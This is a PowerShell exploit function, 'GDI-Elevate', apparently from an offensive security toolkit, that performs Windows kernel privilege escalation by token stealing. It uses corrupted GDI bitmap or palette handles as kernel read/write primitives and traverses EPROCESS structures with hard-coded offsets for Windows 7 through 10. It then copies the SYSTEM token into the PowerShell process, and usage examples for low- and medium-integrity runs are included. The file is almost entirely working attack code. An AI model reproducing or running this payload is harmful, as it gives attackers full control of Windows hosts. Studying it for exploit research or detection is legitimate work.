function GDI-Elevate {
<#
.SYNOPSIS
	A token stealing wrapper for x32/64 which ingests a handle to a manager and worker
	GDI object (Bitmap/Palette).

	Note that this function has two methods, if supplied with a pointer to an arbitrary
	tagTHREADINFO object it can elevate the current process from low integrity. Without the
	tagTHREADINFO pointer it relies on NtQuerySystemInformation (Get-LoadedModules) to leak
	the base address of the ntkernel which requires medium integrity on Win8.1+.

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.PARAMETER GDIManager
	Handle to manager GDI object.

.PARAMETER GDIWorker
	Handle to worker GDI object.

.PARAMETER GDIType
	Bitmap or Palette.

.PARAMETER ThreadInfo
	Optional pointer to tagTHREADINFO (Int64/Int32).

.EXAMPLE
	# MedIL token theft
	C:\PS> GDI-Elevate -GDIManager $ManagerBitmap.BitmapHandle -GDIWorker $WorkerBitmap.BitmapHandle -GDIType Bitmap

	# LowIL token theft
	C:\PS> GDI-Elevate -GDIManager $ManagerPalette.PaletteHandle -GDIWorker $WorkerPalette.PaletteHandle -GDIType Palette -ThreadInfo $ManagerPalette.tagTHREADINFO
#>
	param(
		[Parameter(Mandatory = $True)]
		[IntPtr]$GDIManager,
		[Parameter(Mandatory = $True)]
		[IntPtr]$GDIWorker,
		[Parameter(Mandatory = $True)]
		[ValidateSet(
			'Bitmap',
			'Palette')
		]
		[String]$GDIType,
		[Parameter(Mandatory = $False)]
		$ThreadInfo
	)

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	public static class BitmapElevate
	{
		[DllImport("gdi32.dll")]
		public static extern int SetBitmapBits(
			IntPtr hbmp,
			uint cBytes,
			byte[] lpBits);
		[DllImport("gdi32.dll")]
		public static extern int GetBitmapBits(
			IntPtr hbmp,
			int cbBuffer,
			IntPtr lpvBits);
		[DllImport("gdi32.dll")]
		public static extern int SetPaletteEntries(
			IntPtr hpal,
			uint iStart,
			uint cEntries,
			byte[] lppe);
		[DllImport("gdi32.dll")]
		public static extern int GetPaletteEntries(
			IntPtr hpal,
			uint iStartIndex,
			uint nEntries,
			IntPtr lppe);
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr VirtualAlloc(
			IntPtr lpAddress,
			uint dwSize,
			UInt32 flAllocationType,
			UInt32 flProtect);
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool VirtualFree(
			IntPtr lpAddress,
			uint dwSize,
			uint dwFreeType);
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool FreeLibrary(
			IntPtr hModule);
		[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
			string lpFileName);
		[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
		public static extern IntPtr GetProcAddress(
			IntPtr hModule,
			string procName);
	}
"@

	# Flag architecture $x32Architecture/!$x32Architecture
	if ([System.IntPtr]::Size -eq 4) {
		$x32Architecture = 1
	}

	if ($GDIType -eq "Bitmap") {
		# Arbitrary bitmap Kernel read
		function GDI-Read {
			param ($Address)
			$CallResult = [BitmapElevate]::SetBitmapBits($GDIManager, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
			[IntPtr]$Pointer = [BitmapElevate]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
			$CallResult = [BitmapElevate]::GetBitmapBits($GDIWorker, [System.IntPtr]::Size, $Pointer)
			if ($x32Architecture){
				[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
			} else {
				[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
			}
			$CallResult = [BitmapElevate]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
		}
		
		# Arbitrary bitmap Kernel write
		function GDI-Write {
			param ($Address, $Value)
			$CallResult = [BitmapElevate]::SetBitmapBits($GDIManager, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
			$CallResult = [BitmapElevate]::SetBitmapBits($GDIWorker, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
		}
	} else {
		# Arbitrary palette Kernel read
		function GDI-Read {
			param ($Address)
			$CallResult = [BitmapElevate]::SetPaletteEntries($GDIManager, 0, $([System.IntPtr]::Size/4), [System.BitConverter]::GetBytes($Address))
			[IntPtr]$Pointer = [BitmapElevate]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
			$CallResult = [BitmapElevate]::GetPaletteEntries($GDIWorker, 0, $([System.IntPtr]::Size/4), $Pointer)
			if ($x32Architecture){
				[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
			} else {
				[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
			}
			$CallResult = [BitmapElevate]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
		}
		
		# Arbitrary palette Kernel write
		function GDI-Write {
			param ($Address, $Value)
			$CallResult = [BitmapElevate]::SetPaletteEntries($GDIManager, 0, $([System.IntPtr]::Size/4), [System.BitConverter]::GetBytes($Address))
			$CallResult = [BitmapElevate]::SetPaletteEntries($GDIWorker, 0, $([System.IntPtr]::Size/4), [System.BitConverter]::GetBytes($Value))
		}
	}

	# Parse EPROCESS list
	function Traverse-EPROCESS {
		param($EPROCESS,$TargetPID)
		echo "[+] Traversing ActiveProcessLinks list"
		$NextProcess = $(GDI-Read -Address $($EPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
		while($true) {
			$NextPID = GDI-Read -Address $($NextProcess+$UniqueProcessIdOffset)
			if ($NextPID -eq $TargetPID) {
				echo "[+] PID: $NextPID"
				echo "[+] Token Address: 0x$("{0:X}" -f $($NextProcess+$TokenOffset))"
				echo "[+] Token Value: 0x$("{0:X}" -f $(GDI-Read -Address $($NextProcess+$TokenOffset)))"
				$HashTable = @{
					TokenAddress = $NextProcess+$TokenOffset
					TokenValue = GDI-Read -Address $($NextProcess+$TokenOffset)
				}
				$Script:TokenObject = New-Object PSObject -Property $HashTable
				break
			}
			$NextProcess = $(GDI-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
		}
	}
	
	$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
	$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
	switch ($OSMajorMinor)
	{
		'10.0' # Win10 / 2k16
		{
			if($OSVersion.Build -ge 15063){
				if (!$x32Architecture) {
					$KthreadEprocess = 0x220
					$UniqueProcessIdOffset = 0x2e0
					$TokenOffset = 0x358          
					$ActiveProcessLinks = 0x2e8
				} else {
					$KthreadEprocess = 0x150
					$UniqueProcessIdOffset = 0xb4
					$TokenOffset = 0xfc          
					$ActiveProcessLinks = 0xb8
				}
			}
			if($OSVersion.Build -lt 15063){
				if (!$x32Architecture) {
					$KthreadEprocess = 0x220
					$UniqueProcessIdOffset = 0x2e8
					$TokenOffset = 0x358          
					$ActiveProcessLinks = 0x2f0
				} else {
					$KthreadEprocess = 0x150
					$UniqueProcessIdOffset = 0xb4
					$TokenOffset = 0xf4          
					$ActiveProcessLinks = 0xb8
				}
			}
		}
		
		'6.3' # Win8.1 / 2k12R2
		{
			if(!$x32Architecture){
				$KthreadEprocess = 0x220
				$UniqueProcessIdOffset = 0x2e0
				$TokenOffset = 0x348          
				$ActiveProcessLinks = 0x2e8
			} else {
				$KthreadEprocess = 0x150
				$UniqueProcessIdOffset = 0xb4
				$TokenOffset = 0xec          
				$ActiveProcessLinks = 0xb8
			}
		}
		
		'6.2' # Win8 / 2k12
		{
			if(!$x32Architecture){
				$KthreadEprocess = 0x220
				$UniqueProcessIdOffset = 0x2e0
				$TokenOffset = 0x348          
				$ActiveProcessLinks = 0x2e8
			} else {
				$KthreadEprocess = 0x150
				$UniqueProcessIdOffset = 0xb4
				$TokenOffset = 0xec          
				$ActiveProcessLinks = 0xb8
			}
		}
		
		'6.1' # Win7 / 2k8R2
		{
			if(!$x32Architecture){
				$KthreadEprocess = 0x210
				$UniqueProcessIdOffset = 0x180
				$TokenOffset = 0x208          
				$ActiveProcessLinks = 0x188
			} else {
				$KthreadEprocess = 0x150
				$UniqueProcessIdOffset = 0xb4
				$TokenOffset = 0xf8          
				$ActiveProcessLinks = 0xb8
			}
		}
	}

	if ($ThreadInfo) {
		echo "`n[>] LowIL compatible leak!"
		echo "[+] tagTHREADINFO 0x$("{0:X}" -f $ThreadInfo)"
		$Kthread = GDI-Read -Address $ThreadInfo
		echo "[+] KTHREAD: 0x$("{0:X}" -f $Kthread)"
		$Eprocess = GDI-Read -Address $($Kthread+$KthreadEprocess)
		echo "[+] PowerShell _EPROCESS: 0x$("{0:X}" -f $Eprocess)"
		$PoShTokenAddr = $Eprocess+$TokenOffset
		echo "`n[>] Leaking SYSTEM _EPROCESS.."
		Traverse-EPROCESS -EPROCESS $Eprocess -TargetPID 4
		echo "`n[!] Duplicating SYSTEM token!`n"
		GDI-Write -Address $PoShTokenAddr -Value $TokenObject.TokenValue
	} else {
		echo "`n[>] MediumIL compatible leak!"
		$SystemModuleArray = Get-LoadedModules
		$KernelBase = $SystemModuleArray[0].ImageBase
		echo "[+] Kernel base: 0x$("{0:X}" -f $KernelBase)"
		$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
		$KernelHanle = [BitmapElevate]::LoadLibrary("$KernelType")
		$PsInitialSystemProcess = [BitmapElevate]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
		$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
		echo "[+] PsInitialSystemProcess: 0x$("{0:X}" -f $SysEprocessPtr)"
		$CallResult = [BitmapElevate]::FreeLibrary($KernelHanle)
		$Eprocess = GDI-Read -Address $SysEprocessPtr
		echo "[+] SYSTEM _EPROCESS: 0x$("{0:X}" -f $(GDI-Read -Address $SysEprocessPtr))"
		$SysToken = GDI-Read -Address $($Eprocess+$TokenOffset)
		echo "`n[>] Leaking PowerShell _EPROCESS.."
		Traverse-EPROCESS -EPROCESS $Eprocess -TargetPID $PID
		echo "`n[!] Duplicating SYSTEM token!`n"
		GDI-Write -Address $TokenObject.TokenAddress -Value $SysToken
	}
}